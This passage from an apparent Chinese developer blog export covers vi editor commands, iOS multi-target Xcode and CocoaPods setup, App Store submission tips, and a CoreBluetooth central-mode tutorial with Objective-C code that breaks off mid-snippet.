「#x」：例如，「6x」表示删除光标所在位置的“后面”6个字符 「X」：大写的X，每按一次，删除光标所在位置的“前面”一个字符 「#X」：例如，「20X」表示删除光标所在位置的“前面”20个字符 「dd」：删除光标所在行 「#dd」：从光标所在行开始删除#行 5）. 复制 「yw」：将光标所在之处到字尾的字符复制到缓冲区中 「#yw」：复制#个字到缓冲区 「yy」：复制光标所在行到缓冲区 「#yy」：例如，「6yy」表示拷贝从光标所在的该行“往下数”6行文字 「p」：将缓冲区内的字符贴到光标所在位置。注意：所有与“y”有关的复制命令都必须与“p”配合才能完成复制与粘贴功能 6）. 替换 「r」：替换光标所在处的字符 「R」：替换光标所到之处的字符，直到按下「ESC」键为止 7）. 回复上一次操作 「u」：如果您误执行一个命令，可以马上按下「u」，回到上一个操作 、按多次“u”可以执行多次回复 8）. 更改 「cw」：更改光标所在处的字到字尾处 「c#w」：例如，「c3w」表示更改3个字 9）. 跳至指定的行 「ctrl」+「g」列出光标所在行的行号 「#G」：例如，「15G」，表示移动光标至文章的第15行行首 4、Last line mode下命令简介 在使用「last line mode」之前，请记住先按「ESC」键确定您已经处于「command mode」下后，再按「：」冒号即可进入「last line mode」 A) 列出行号 「set nu」：输入「set nu」后，会在文件中的每一行前面列出行号 B) 跳到文件中的某一行 「#」：「#」号表示一个数字，在冒号后输入一个数字，再按回车键就会跳到该行了，如输入数字15，再回车，就会跳到文章的第15行 C) 查找字符 「/关键字」：先按「/」键，再输入您想寻找的字符，如果第一次找的关键字不是您想要的，可以一直按「n」会往后寻找到您要的关键字为止 「?关键字」：先按「?」键，再输入您想寻找的字符，如果第一次找的关键字不是您想要的，可以一直按「n」会往前寻找到您要的关键字为止 D) 保存文件 「w」：在冒号输入字母「w」就可以将文件保存起来 E) 离开vi 「q」：按「q」就是退出，如果无法离开vi，可以在「q」后跟一个「!」强制离开vi 「qw」：一般建议离开时，搭配「w」一起使用，这样在退出的时候还可以保存文件 5、vi命令列表 1、下表列出命令模式下的一些键的功能： 123456789101112131415161718192021222324252627282930h 左移光标一个字符h 左移光标一个字符k 光标上移一行j 光标下移一行^ 光标移动至行首0 数字“0”，光标移至文章的开头G 光标移至文章的最后$ 光标移动至行尾Ctrl+f 向前翻屏Ctrl+b 向后翻屏Ctrl+d 向前翻半屏Ctrl+u 向后翻半屏i 在光标位置前插入字符a 在光标所在位置的后一个字符开始增加o 插入新的一行，从行首开始输入ESC 从输入状态退至命令状态x 删除光标后面的字符#x 删除光标后的＃个字符X (大写X) 删除光标前面的字符#X 删除光标前面的#个字符dd 删除光标所在的行#dd 删除从光标所在行数的#行yw 复制光标所在位置的一个字# yw复制光标所在位置的#个字yy 复制光标所在位置的一行#yy 复制从光标所在行数的#行p 粘贴u 取消操作cw 更改光标所在位置的一个字#cw 更改光标所在位置的#个字 2、下表列出行命令模式下的一些指令 123456w filename 储存正在编辑的文件为filenamewq filename 储存正在编辑的文件为filename，并退出viq! 放弃所有修改，退出viset nu 显示行号/或? 查找，在/后输入要查找的内容n 与/或?一起使用，如果查找的内容不是想要找的关键字，按n或向后（与/联用）或向前（与?联用）继续查找，直到找到为止 对于第一次用vi，有几点注意要提醒一下： 1、用vi打开文件后，是处于「命令行模式（command mode）」，您要切换到「插入模式（Insert mode）」才能够输入文字。 切换放方法：在「命令行模式（command mode）」下按一下字母「i」就可以进入「插入模式（Insert mode）」，这时候你就可以开始输入文字了 2、编辑好后，需从插入模式切换为命令行模式才能对文件进行保存，切换方法：按「ESC」键 3、保存并退出文件：在命令模式下输入:wq即可！（别忘了wq前面的:）]]></content>
      <categories>
        <category>工具</category>
        <category>VIM</category>
      </categories>
      <tags>
        <tag>工具</tag>
        <tag>VIM</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[iOS开发多Target（二）：复制Target]]></title>
    <url>%2Farchives%2F9c6697bb.html</url>
    <content type="text"><![CDATA[祝你今天愉快，你明天的愉快留着我明天再祝。 ——王小波《爱你就像爱生命》 项目中复制添加Target注意点 以MultiTarget为例子，复制添加一个Target 如果使用Cocoapods管理项目依赖，一定要先把pods初始化后再复制Target 复制Target后需要重新设置Podfile文件的（多个Target依赖库） 添加文件和素材的时候注意对应的Target选择 打开需要添加Target的项目，选择对应的Target复制 复制完成后修改复制完生成的文件 选择中间的仅复制，复制完成后修改复制的文件 MultiTarget Copy –&gt; MultiTarget_Second MultiTarget-info.plist –&gt; info_second.plist 修改完之后需要选中当前的Target后General里面选择对应的修改后的文件info_second.plist 修改Schemes 的Target名称 MultiTarget Copy –&gt; MultiTarget_Second 配置不同的App图标和启动图 如果需要共用一套图标，注意勾选Target Membership 如果需要设置不同的图片素材对应不同的Target,注意选择不同版本的Target Membership 可以配置： Bundle identifier Display Name Version Bulid 证书 App图标和启动图标 配置不同的标记 配置复制后Target标识，如 TARGET_SECOND=1 注意Debug和Release模式都需要配置 重新配置Podfile文件，重新安装依赖库，如123456789platform :ios, &apos;9.0&apos;target &apos;MultiTarget&apos; do pod &apos;SVProgressHUD&apos;endtarget &apos;MultiTarget_Second&apos; do pod &apos;SVProgressHUD&apos;end 项目中实战 在文件中根据设置的Target标记，区分不同的Target 直接切换不同的Target，即可编译生成对应的app 测试代码逻辑同新建Target一样，直接采用之前的截图]]></content>
      <categories>
        <category>iOS</category>
      </categories>
      <tags>
        <tag>iOS</tag>
        <tag>Multi Target</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[iOS开发多Target（一）：新建Target]]></title>
    <url>%2Farchives%2Fe016e61f.html</url>
    <content type="text"><![CDATA[在我周围，像我这种性格的人特多——在公众场合什么都不说，到了私下里却妙语连珠，换言之，对信得过的人什么都说，对信不过的人什么都不说。 ——王小波《沉默的大多数》 需求1: 需求不同, App分免费版和专业版 或者分国内版和国际版或者分企业版和App Store版除了个别页面不同, 其他构建页面都完全一样 思考: 第一种:新建两个项目工程开发,把相同的页面封装并拷贝到项目使用 第二种:在同一个项目中,建立两个不同的target进行开发 优劣: 第一种方式:项目之间独立分开,耦合和干扰度小,但是项目开发消耗有点大 第二种方式:节省项目资源拷贝,但是在配置文件和提交到git或者SVN仓库容易冲突 解决方案 使用多Target方式，在原有的基础上面New一个Target 需求2: App需要应对不同的测试需求：开发环境、测试环境、预发布环境、发布环境 需要不同环境的App可以同时运行，以对比不同版本之间的差异 需要不同环境的App运行后有不同的：App名称、图标、启动图等等 解决方案 使用多Target方式，在原有的基础上面Duplicate一个Target Cocoapods需要重新处理 如果项目使用了Cocoapods，那么增加Target后，不管是新建Target或者复制Target都需要处理Podfile文件 方式1123456789101112platform :ios, &quot;8.0&quot;target &quot;MultiTarget&quot; doworkspace &apos;MultiTarget&apos;link_with &apos;MultiTarget&apos;, &apos;MultiTarget_Second&apos;pod &apos;ReactiveCocoa&apos;, &apos;~&gt; 2.5&apos;pod &apos;SVProgressHUD&apos;pod &apos;Masonry&apos;end 方式2 （推荐）1234567891011source &apos;https://github.com/CocoaPods/Specs.git&apos;platform :ios, &apos;8.0&apos;target &apos;MultiTarget&apos; dopod &apos;SVProgressHUD&apos;pod &apos;GoogleMaps&apos;endtarget &apos;MultiTarget&apos; dopod &apos;SVProgressHUD&apos;pod &apos;BaiduMapKit&apos;end 项目中新建Target注意点 以MultiTarget项目为例子，添加一个Target 如果使用Cocoapods管理项目依赖，尽量先把pods初始化后再复制Target 复制Target后需要重新设置Podfile文件的 添加文件和素材的时候注意对应的Target选择 需要手动把另一个Target里面的需要的所有的.m文件和nib文件都在Target Membership 里面勾选 如果有多语言文件也需要在Target Membership 里面勾选 如果配置有pch文件、需要再新建的Target里面重新配置pch文件路径 需要单独配置一些info.plist选项，如网络ATS/权限声明等 需要重新设置一遍依赖Target已经设置过的一些控制面板的属性，如后台，定位，bitcode等 项目新建一个Target 继承配置 删除不需要的默认生成的文件和xib 修改AppDelegate名称，修改其继承自上一个Target的AppDelegate 修改程序启动调用父类的配置信息 修改父类AppDelegate文件权限 可以供两个Target访问 配置不同的标记 在需要配置的Target中添加标记, 如新增加的Target 添加TARGET_SECOND=1 注意Debug和Release模式都需要配置 配置对应的启动图和App图标素材 可以在不同的Targe种配置不同的App图标、启动图、以及其他图标 如果两个Target共用一套图标素材，则在需要共用的Assets.xcassets中的Target Membership中勾选需要共享的Target. 重新配置Podfile文件，重新安装依赖库，如123456789platform :ios, &apos;9.0&apos;target &apos;MultiTarget&apos; do pod &apos;SVProgressHUD&apos;endtarget &apos;MultiTarget_Second&apos; do pod &apos;SVProgressHUD&apos;end 项目中实战 删除项目每个Target中的Main interface 中的Main，不需要从XIB中加载，因为第二个Target是和第一个Target初始化入口相同，在Appdelegate中。 需要两个项目共享的.m xib文件都需要Target Membership中勾选需要共享的Target. 在文件中根据设置的Target标记，区分不同的Target 直接切换不同的Target，即可编译生成对应的app]]></content>
      <categories>
        <category>iOS</category>
      </categories>
      <tags>
        <tag>iOS</tag>
        <tag>Multi Target</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[iOS开发之AppStore篇]]></title>
    <url>%2Farchives%2F9b9b2c59.html</url>
    <content type="text"><![CDATA[iOS开发之AppStore篇– 上架图片尺寸 需要一张通用的1024 x 1024 在App Store里面用 （xcode9 之前在App Store里面上传；xcode9之后在开发工具里面配置） 其格式必须为 JPG 或 PNG，最低分辨率至少为 72 DPI，并采用 RGB 色彩空间 不能包含图层或圆角 不能有透明像素和alpha通道 桌面图标 (app icon) for iPhone6 plus(@3x) : 180 x 180 // 命名规范：App-60@3x for iPhone 6/5s/5/4s/4(@2x) : 120 x 120 // 命名规范：App-60@2x 系统搜索框图标 (Spotlight search results icon) for iPhone6 plus(@3x) : 120 x 120 // 命名规范：Spotlight-40@3x for iPhone6/5s/5/4s/4(@2x) : 80 x 80 // 命名规范：Spotlight-40@2x 系统设置图标 (Settings icon) for iPhone6 plus(@3x) : 87 x 87 // 命名规范：Settings-29@3x for iPhone6/5s/5/4s/4(@2x) : 58 x 58 // 命名规范：Settings-29@2x 启动图片 (launch image) for iPhoen5s/5(@2x) : 640 x 1136 // 命名规范：LaunchImage-568h@2x for iPhone 6(@2x) : 750 x 1334 // 命名规范： LaunchImage-667h@2x for iPhone 6 plus (@3x) : 1242 x 2208 // 命名规范： LaunchImage-736h@3x for iPhoneX (@3x) : 1125 x 2436 // 命名规范： LaunchImage-812h@3x 预览和屏幕快照关于App Store上架电脑系统是测试版或者Xcode是测试版 打包上传出错报如下错误代码，最后通过重装系统（正式版）解决 注意即使用测试版系统或者Xcode打包的程序上传成功、最后上传到AppStore审核的时候也有可能被拒 1ERROR ITMS-90167: &quot;No .app bundles found in the package&quot; 项目中有静态库不支持bitcode上架打包错误1‘xxx/lib**SDK.a(**ForSDK.o)’does not contain bitcode. You must rebuild it with bitcode enabled (Xcodesetting ENABLE_BITCODE), obtain an updated library from the vendor, or disablebitcode for this target. for architecture arm64 解决方法 重新打包静态库，使之支持bitcode 如果静态库比较老，没法重新编译，就需要关闭xcode的bitcode功能 Target -&gt; Build Settings -&gt; Bulid option : Enable Bitcode 设置为NO 项目中有设置URL Schemes1error itms-90158: &quot;the following url schemes found in your app are not in the current format:[mqq://]. 可能是跳转的app id 不正确 app审核通过后AppStore依然搜索不到解决办法 偶尔审核通过但是搜索不到，一般是DNS缓存问题 需要等待苹果服务器刷新 可以通过下面的方法加速刷新 在价格与销售范围里面修改：价格 —&gt; 等级1（收费即可）、销售地区 全部取消只选择 -&gt; 中国, 保存，此时刷新app审核状态就会变为 pending contract（协商价格） 然后再在价格与销售范围里面修改：价格 —&gt; 等级0（app原来的价格 我这里是免费）、销售地区 全部选择 -&gt; 所有地区, 保存，此时刷新app审核状态就会变为 Ready for sale（可供销售） 等待大概半个到一个小时就可以在AppStore里面搜索到了 打包上传后再iTunes connect后台一直看不到上传的包文件 可能是info.plist里面需要配置的申请权限没有配置，这时会收到APPle发送的邮件解释的很清楚，但是有时可能appleID账号是老板的私人邮箱，老板收到又没有及时转发给你，这时候就要找老板问下是否有接收到邮件。 关于游客账户 除社交、和财产挂钩等app可以只提供注册后登录，其他app应视情况提供游客登录模式，在应用内限制游客账户的功能 如果不提供游客账号登录功能一般不会出问题，但是主要看人品，不能确定哪一版本就给拒了App Store 审核指南（中文） 关于和硬件相关的app 我们公司大部分都是和单片机等通讯的硬件产品，关于这类app，上架后需要录制软件和硬件的操作交互视频上传YouTube（建议）或者youku等平台，然后在iTunes connect 里面提供上传视频连接以供审核。]]></content>
      <categories>
        <category>iOS</category>
      </categories>
      <tags>
        <tag>iOS</tag>
        <tag>App Store</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[iOS蓝牙开发之中心设备篇]]></title>
    <url>%2Farchives%2Fa46fbeec.html</url>
    <content type="text"><![CDATA[当我跨过沉沦的一切，向着永恒开战的时候，你是我的军旗。—— 王小波《爱你就像爱生命》 关于蓝牙4.0 蓝牙4.0是由蓝牙技术联盟在2012年发布的最新蓝牙版本，较3.0版本更省电、成本低、延迟低、超长有效连接距离、AES-128加密等。蓝牙4.0设备因为低耗电，所以也叫做BLE （Bluetooth Low Energy）。 支持两种部署方式：双模式和单模式。 双模式包含传统蓝牙部分（Classsic Bluetooth）和低功耗蓝牙部分（Bluetooth Low Energy 即BLE)。 在BLE4.0之前，连接的蓝牙设备是需要经过MFI认证的 MFI – Make For ipad ,iphone, itouch 等专们为苹果设备制作的设备 Apple设备对BLE4.0支持 iPhone4S及以后的设备 第三代iPad及以后的设备 iMac、MacBookAir、MacBook Pro等 系统是从iOS6开始支持BLE4.0 CoreBluetooth框架 CoreBluetooth是Apple基于蓝牙4.0标准封装的一套蓝牙开发框架，也就是说使用CoreBluetooth开发的时候，对应的蓝牙设备必须也遵循蓝牙4.0。 CoreBluetooth开发分两种模式 中心模式（Central）: 接收周边蓝牙发来的广播数据。 外设模式（Peripheral）: 自己作为蓝牙设备，对外广播数据。 一个外部设备包含一个或多个服务，一个服务包含一个或多个特征。 中心模式的开发流程 建立中心管理者 扫描外设 连接外设 扫描外设中的服务和特征 获取外设的services 获取外设的Characteristics,获取Characteristics的值，获取Characteristics的Descriptor和Descriptor的值 订阅Characteristic 与外设做数据交互(explore and interact) 断开连接(disconnect) 初始化 使用蓝牙需要在inof.plist文件配置Privacy - Bluetooth Peripheral Usage Description KEY向用户请求蓝牙权限 导入蓝牙开发框架遵守两个协议 初始化一个中心设备管理者并设置代理 12345678910#import &lt;CoreBluetooth/CoreBluetooth.h&gt;@interface XSBleManager () &lt;CBCentralManagerDelegate, CBPeripheralDelegate&gt;/** 中心设备管理者 */@property (nonatomic, strong) CBCentralManager *centralManager;@end// 初始化并设置代理_centralManager = [[CBCentralManager alloc] initWithDelegate:self queue:nil]; 监听蓝牙状态改变 初始化蓝牙中心设备管理者之后，会检测并返回当前系统蓝牙状态 当蓝牙处于打开可用状态，我们就可以使用蓝牙发起扫描周边的外设了 1234567891011- (void)centralManagerDidUpdateState:(CBCentralManager *)central;// central.state 即是当前的蓝牙状态typedef NS_ENUM(NSInteger, CBManagerState) &#123; CBManagerStateUnknown = 0, CBManagerStateResetting, // 重置中 CBManagerStateUnsupported, // 不支持 CBManagerStateUnauthorized, // 未授权 CBManagerStatePoweredOff, // 关闭 CBManagerStatePoweredOn, // 打开&#125; NS_ENUM_AVAILABLE(10_13, 10_0); 扫描外设 扫描设别可以扫描周边所有的设备也可以根据服务UUID过滤掉不符合的设备，可根据需求选择 只在必要的时候设置 CBCentralManagerScanOptionAllowDuplicatesKey peripheral 每秒都在发送大量的数据包，scanForPeripheralsWithServices:options:方法会将同一 peripheral 发出的多个数据包合并为一个事件，然后每找到一个 peripheral 都会调用 centralManager:didDiscoverPeripheral:advertisementData:RSSI:方法。另外，当已发现的 peripheral 发送的数据包有变化时，这个代理方法同样会调用。 以上合并事件的操作是 scanForPeripheralsWithServices:options:的默认行为，即未设置 option参数。如果不想要默认行为，可将 option设置为 CBCentralManagerScanOptionAllowDuplicatesKey。设置以后，每收到广播，就会调用上面的回调（无论广播数据是否一样）。关闭默认行为一般用于以下场景：根据 peripheral 的距离来初始化连接（距离可用信号强度 RSSI 来判断）。设置这个 option会对电池寿命和 app 的性能产生不利影响，所以一定要在必要的时候，再对其进行设置。 1234// 方式1 ：扫描所有设备 [_centralManager scanForPeripheralsWithServices:nil options:nil];// 方式2 ：扫描特定的服务的设备 服务UUID可以查询公司文档或者和硬件工程师沟通[_centralManager scanForPeripheralsWithServices:@[[CBUUID UUIDWithString:ServiceUUIDString1], [CBUUID UUIDWithString:ServiceUUIDString2]] options:@&#123; CBCentralManagerScanOptionAllowDuplicatesKey:@YES &#125;]; 扫描成功后就会调用如下方法将外设的名称、标识、信号强度、状态等信息返回 可以在此方法筛选和过滤扫描到的设备，如根据公司外设的命名规定和搜索到的设备名称对比，过滤掉一些不符合的设备 注意点： 如果需要获取蓝牙的名称，推荐从advertisementData中获取，而不要直接获取aPeripheral中的，因为有时候蓝牙设备修改名称 peripheral.name 不会立即刷新，而advertisementData会实时刷新 iOS框架是不能通过Mac地址直接连接蓝牙的而且Apple公司也屏蔽了设备的Mac地址，取代返回的是一个根据某些参数生成的UUID,这一点和安卓不同，并且iOS蓝牙连接外设获取的的唯一标识并不是绝对唯一的: 重启手机就可能导致设备的唯一标识发生变化，而且不同手机连接同一个设备获取到的蓝牙设备标识也是不同的 如果对连接的设备的唯一标识有特别的需求，可以通过和硬件工程师沟通将Mac地址放入advertisementData中来实现获取设备的Mac地址 1234567- (void)centralManager:(CBCentralManager *)central didDiscoverPeripheral:(CBPeripheral *)aPeripheral advertisementData:(NSDictionary *)advertisementData RSSI:(NSNumber *)RSSI&#123; if ([peripheral.namehasPrefix:@"XXX"] ) &#123; // 停止扫描 // 连接设备 &#125;&#125; 连接外设 扫描到外设，就可以发起连接了 注意：连接外设前，需要关闭扫描以省电并减少位置错误发生 12[_centralManager stopScan];// 停止扫描[manager connectPeripheral:peripheral options:nil]; // 连接设备 连接外设成功调用方法，在此方法可以开始扫描服务信息 注意：一定要设置代理，不然扫描到服务信息也不会有代理回调 123456- (void)centralManager:(CBCentralManager *)central didConnectPeripheral:(CBPeripheral *)peripheral&#123; XSLogFunc [peripheral setDelegate:self]; // 设置代理 [peripheral discoverServices:nil]; // 开始扫描服务&#125; 连接外设失败调用方法，此时需要清空代理 12345678- (void)centralManager:(CBCentralManager *)central didFailToConnectPeripheral:(CBPeripheral *)peripheral error:(NSError *)error&#123; XSLogFunc if (peripheral) &#123; peripheral.delegate = nil; peripheral = nil; &#125;&#125; 扫描到外设 扫描到外设服务时如果传入nil, 则代表扫描所有的外设服务 但实际上，你可能只需要其中的某几个。搜索全部的操作既耗时又耗电，所以应该提供一个要搜索的 service 的 UUID 数组 123[peripheral discoverServices:nil]; // 假设你只需要用到 peripheral 提供的众多 service 的两个，那么在搜索 service 的时候可以设置要搜索的 service 的 UUID// [peripheral discoverServices:@[firstServiceUUID, secondServiceUUID]]; 扫描到外设服务的回调 扫描扫服务信息后，既可以去扫描服务里面的特征 1234567- (void)peripheral:(CBPeripheral *)peripheral didDiscoverServices:(NSError *)error&#123; XSLogFunc for (CBService *aService in peripheral.services) &#123; [peripheral discoverCharacteristics:nil forService:aService]; // 扫描服务中的特征 &#125;&#125; 扫描特征 获取到对应的需要的特征，我们既可以对特征进行订阅或者和设别进行数据交互以及升级设备蓝牙信息等等操作 接收 characteristic 数据的方式有两种： 在需要接收数据的时候，调用 readValueForCharacteristic:，这种是需要主动去接收的。 用 setNotifyValue:forCharacteristic:方法订阅，当有数据发送时，可以直接在回调中接收。 1234567891011121314151617181920212223242526272829- (void)peripheral:(CBPeripheral *)peripheral didDiscoverCharacteristicsForService:(CBService *)service error:(NSError *)error&#123; XSLogFunc if (error) &#123; XSLog(@"搜索Characteristic失败:%@", peripheral.services); return; &#125; for (CBCharacteristic *characteristic in service.characteristics) &#123; XSLog(@"搜索到的服务：%@ 对应的所有：Characteristic:%@", service, characteristic); // 具体的特征值的作用请参考公司文档或者和公司硬件工程师沟通 // 可订阅的特征// if ([characteristic.UUID.UUIDString isEqualToString:CharacteristicNotifyUUIDString]) &#123;// [peripheral setNotifyValue:YES forCharacteristic:characteristic];//// &#125; // OTA升级特征// if ([characteristic.UUID.UUIDString isEqual:CharacteristicWriteOTAUUIDString]) &#123;//// &#125; // 可写的特征// if ([characteristic.UUID.UUIDString isEqual:CharacteristicWriteUUIDString]) &#123;//// &#125; &#125;&#125; 特征值类型 123456789101112typedef NS_OPTIONS(NSUInteger, CBCharacteristicProperties) &#123; CBCharacteristicPropertyBroadcast = 0x01, CBCharacteristicPropertyRead = 0x02, CBCharacteristicPropertyWriteWithoutResponse = 0x04, CBCharacteristicPropertyWrite = 0x08, CBCharacteristicPropertyNotify = 0x10, CBCharacteristicPropertyIndicate = 0x20, CBCharacteristicPropertyAuthenticatedSignedWrites = 0x40, CBCharacteristicPropertyExtendedProperties = 0x80, CBCharacteristicPropertyNotifyEncryptionRequired NS_ENUM_AVAILABLE(NA, 6_0) = 0x100, CBCharacteristicPropertyIndicateEncryptionRequired NS_ENUM_AVAILABLE(NA, 6_0) = 0x200&#125;; 读取特征的数据 characteristic 包含了 service 要传输的数据。例如温度设备中表达温度的 characteristic，就可能包含着当前温度值。这时我们就可以通过读取 characteristic，来得到里面的数据。 当找到 characteristic 之后，可以通过调用CBPeripheral的readValueForCharacteristic:方法来进行读取。 当你调用上面这方法后，会回调peripheral:didUpdateValueForCharacteristic:error:方法，其中包含了要读取的数据。如果读取正确，可以用以下方式来获得值： 1234- (void)peripheral:(CBPeripheral *)peripheral didUpdateValueForCharacteristic:(CBCharacteristic *)characteristic error:(NSError *)error &#123; NSData *data = characteristic.value; // parse the data as needed&#125; 注意，不是所有 characteristic 的值都是可读的，你可以通过CBCharacteristicPropertyReadoptions 来进行判断（这个枚举会在下一章中介绍到）。如果你尝试读取不可读的数据，那上面的代理方法会返回相应的 error。 订阅 Characteristic 数据 其实使用readValueForCharacteristic:方法并不是实时的。考虑到很多实时的数据，比如心率这种，那就需要订阅 characteristic 了。 可以通过调用CBPeripheral的setNotifyValue:forCharacteristic:方法来实现订阅，注意第一个参数是YES。 1[peripheral setNotifyValue:YES forCharacteristic:interestingCharacteristic]; 如果是订阅，成功与否的回调是peripheral:didUpdateNotificationStateForCharacteristic:error:，读取中的错误会以 error 形式传回： 当然也不是所有 characteristic 都允许订阅，依然可以通过CBCharacteristicPropertyNoifyoptions 来进行判断 123456- (void)peripheral:(CBPeripheral *)peripheral didUpdateNotificationStateForCharacteristic:(CBCharacteristic *)characteristic error:(NSError *)error &#123; if (error) &#123; XSLog(@"Error changing notification state: %@", [error localizedDescription]); &#125;&#125; 数据写入特征 写数据其实是一个很常见的需求，如果 characteristic 可写，你可以通过CBPeripheral类的writeValue:forCharacteristic:type:方法来向设备写入NSData数据。 CBCharacteristicWriteWithResponse 指定写入成功后回调代理方法 CBCharacteristicWriteWithoutResponse 指定写入成功后不需要回调代理方法 1[_connectedPeripheral writeValue:data forCharacteristic:toCharacteristic type:CBCharacteristicWriteWithResponse]; 如果写入成功后要回调，那么回调方法是peripheral:didWriteValueForCharacteristic:error:。如果写入失败，那么会包含到 error 参数返回。 注意：characteristic 也可能并不支持写操作，可以通过CBCharacteristic的properties属性来判断。 1- (void)peripheral:(CBPeripheral *)peripheral didWriteValueForCharacteristic:(CBCharacteristic *)characteristic error:(NSError *)error; 关于数据分包及数据校验的一些扩展 蓝牙4.0因为是低功耗的，所以数据发送的效率就没有之前版本蓝牙的收发效率高，每次接收和发送数据不能超过20个字节 1、写入数据：如果想最大程度的的发挥蓝牙的效率，就需要对发送的数据进行分包处理并且尽可能保证除去协议所占的字节后每包携带的有效数据长度比较大 假设我们发送的每一包数据协议格式为：header(1Byte) + Length(1Byte) + cmd(1Byte) + paramData（&lt;= 16Byte） + check(1Byte) 如果需要发送的数据小于16个字节，直接按协议组装数据发送 如果需要发送的数据大于16个字节，需要按16个字节分包后按协议组装数据发送 1234567891011121314151617181920212223242526272829303132333435363738394041/** 写入不分包数据 @param data 数据 @param toCharacteristic 要写入的特征值 */- (void)writeSinglePacketData:(NSData *)data toCharacteristic:(CBCharacteristic *)toCharacteristic &#123; if (!toCharacteristic || !_bleClient.isBleConnected || kObjectIsEmpty(data)) &#123; return; &#125; self.isContinueWriting = NO; // 是否需要继续写入数据 [_bleClient.connectedPeripheral writeValue:data forCharacteristic:toCharacteristic type:CBCharacteristicWriteWithResponse];&#125;/** 写入需要分包数据 @param data 需要分包发送数据 @param toCharacteristic 要写入的特征值 */- (void)writeMultiplePacketData:(NSData *)data toCharacteristic:(CBCharacteristic *)toCharacteristic &#123; if (!toCharacteristic || !_bleClient.isBleConnected || kObjectIsEmpty(data)) &#123; return; &#125; self.isContinueWriting = YES; // 是否需要继续写入数据 self.subdataOffset = 0; // 已经截取的数据长度 self.needSubData = data; // 需要分包的数据 [self writeSubDataToCharacteristic:toCharacteristic];&#125;/** 将截取的数据发送出去 */- (void)writeSubDataToCharacteristic:(CBCharacteristic *)characteristic &#123; NSInteger totalLength = self.needSubData.length; NSInteger remainLength = totalLength - self.subdataOffset; NSInteger rangLength = remainLength &gt; XSCentralmanagerOTADataSubLength ? XSCentralmanagerOTADataSubLength:remainLength; NSData *data = [self.needSubData subdataWithRange:NSMakeRange(self.subdataOffset, rangLength)]; self.subdataOffset += data.length; if (kObjectIsEmpty(data)) &#123; // 通知代理写入错误 XSLog(@"没有数据可以写入了。。。✍️✍️✍️"); return; &#125; // 继续写入数据 [_bleClient.connectedPeripheral writeValue:data forCharacteristic:characteristic type:CBCharacteristicWriteWithResponse];&#125; self.isContinueWriting标记在每包数据写入成功的回调- (void)blePeripheral:(CBPeripheral *)peripheral didWriteValueForCharacteristic:(CBCharacteristic *)characteristic error:(NSError *)error里面是否继续写入下一包数据 2、接收数据：如果接受的数据过大，也会是分包接收到。 所以就需要在接收蓝牙数据的地方，校验接收到的每一包数据长度以确保数据接收完整 可以创建一个数据接收蓝牙数据校验的工具单例 将数据协议定义为一个枚举 提供一个方法传入蓝牙接收到的数据以及一个数据接收完整的回调结果block 每次的数据都按协议进行校验并缓存中间的有效数据 如果已经接收到的有效数据和数据总长度（协议中的发送长度字节）不相同就继续等待接收 如果已经接收到的有效数据和数据总长度（协议中的发送长度字节）相同就代表数据接收完整、回调block 1234567891011121314151617181920212223242526272829303132333435// 在接收到蓝牙数据的方法校验数据- (void)blePeripheral:(CBPeripheral *)peripheral didUpdateValueForCharacteristic:(CBCharacteristic *)characteristic error:(NSError *)error &#123; XSLogFunc if (error) &#123; XSLog(@"读取Characteristic数据失败:%@", error); return; &#125; NSData *value = characteristic.value; XSLog(@"读取到特征的数据:%@", value); // 接收到的数据完整性校验 [[XSVerifyBleDataTool shareInstance] handleReceivedDataWithData:value complete:^&#123; NSInteger responseType = XSBleVerifyUtility.responseCmd; if (_dispatchCmdComplete) &#123; _dispatchCmdComplete(responseType); &#125; &#125;];&#125;// 数据校验工具单例XSVerifyBleDataTool提供给外界校验方法typedef NS_ENUM(NSUInteger, XSReceivedDataState) &#123; XSReceivedDataStateHeader, /**&lt; header */ XSReceivedDataStateLength,/**&lt; 数据总长度 */ XSReceivedDataStateData,/**&lt; 数据 */ XSReceivedDataStateCheckSum,/**&lt; 校验和 */&#125;;/** 处理蓝牙接收到的数据 @param receivedData 接收到的数据 @param complete 处理回调 */- (void)handleReceivedDataWithData:(NSData *)receivedData complete:(void (^)(void))complete; 3、关于指令调用 以为可能其他地方也会用到蓝牙，所以推荐把整个蓝牙连接及验证封装成一个蓝牙工具类 因为App和外设交互的指令也会比较多，可能会分散在项目的不同地方，而蓝牙数据的写入和接收都是在代理方法中回调，我的做法是把调用蓝牙指令写入数据的逻辑抽成公共的方法：传需要写入的数据，写入成功的回调Block(可以调用的指令，状态回调回去) 123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051/** 派发蓝牙指令 @param command 蓝牙指令 @param paramData 是否需要发送参数 @param complete 指令响应后回调的block */- (void)dispatchCommand:(XSBleRequestState)command paramData:(NSData *)paramData completion:(void (^)(NSInteger resultCommand))complete &#123; _dispatchCmdComplete = complete; [self handleUniversalBleRequestWithProtocolHeader:XSProtocolHeaderBle bleCmd:command paramData:paramData];&#125;/** 派发蓝牙指令 @param protocolHeader 指令头 （区分不同的蓝牙协议） @param command 蓝牙指令 @param paramData 是否需要发送参数 @param complete 指令响应后回调的block */- (void)dispatchWithProtocolHeader:(XSProtocolHeader)protocolHeader command:(XSBleRequestState)command paramData:(NSData *)paramData completion:(void (^)(NSInteger resultCommand))complete &#123; _dispatchCmdComplete = complete; [self handleUniversalBleRequestWithProtocolHeader:protocolHeader bleCmd:command paramData:paramData];&#125;/** 发送蓝牙指令的通用处理方法(处理完数据后直接写入蓝牙) @param bleCmd 发送的蓝牙指令 @param paramData 发送的数据 */- (void)handleUniversalBleRequestWithProtocolHeader:(XSProtocolHeader)protocolHeader bleCmd:(XSBleRequestState)bleCmd paramData:(NSData *)paramData &#123; NSData *resultData = [NSData data]; if (kObjectIsEmpty(paramData)) &#123; resultData = [XSDataProtocol handleDataWithProtocolHeader:protocolHeader command:bleCmd]; &#125; else &#123; resultData = [XSDataProtocol handleDataWithProtocolHeader:protocolHeader command:bleCmd paramData:paramData]; // 按照约定的协议组装数据 &#125; if (resultData.length) &#123; XSLog(@"最终发送的指令数据：%@", resultData); if (resultData.length &gt; 20) &#123; [self writeMultiplePacketData:resultData toCharacteristic:_bleClient.writeCharacteristic]; &#125; else &#123; [self writeSinglePacketData:resultData toCharacteristic:_bleClient.writeCharacteristic]; &#125; &#125;&#125; 所以大概的写入逻辑就可以简化为 1234[_bleMgr dispatchCommand:XSBleRequestStatusBattery_Level paramData:nil completion:^(NSInteger resultCommand) &#123; 